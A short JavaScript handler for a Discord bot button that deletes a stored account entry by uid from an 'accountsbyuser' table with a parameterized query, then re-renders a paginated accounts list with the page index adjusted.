const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");

module.exports = {
    name: "deletefinal",
    callback: async (client, interaction) => {
        let [t, id, current, uid] = interaction.customId.split("|"); // Extract UID from customId
        current = parseInt(current);

        // Delete the account by UID
        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=? AND uid=?`, [id, uid]);

        // Fetch remaining accounts to check if the current page is still valid
        const remainingAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=?`, [id]);

        // If no accounts remain, reset current to 1
        if (remainingAccounts.length === 0) {
            current = 1;
        } else if (current > remainingAccounts.length) {
            // If current exceeds the number of remaining accounts, adjust it
            current = remainingAccounts.length;
        }

        // Return to the accounts message with the updated current page
        return interaction.update(await accountsmsg(id, current));
    }
};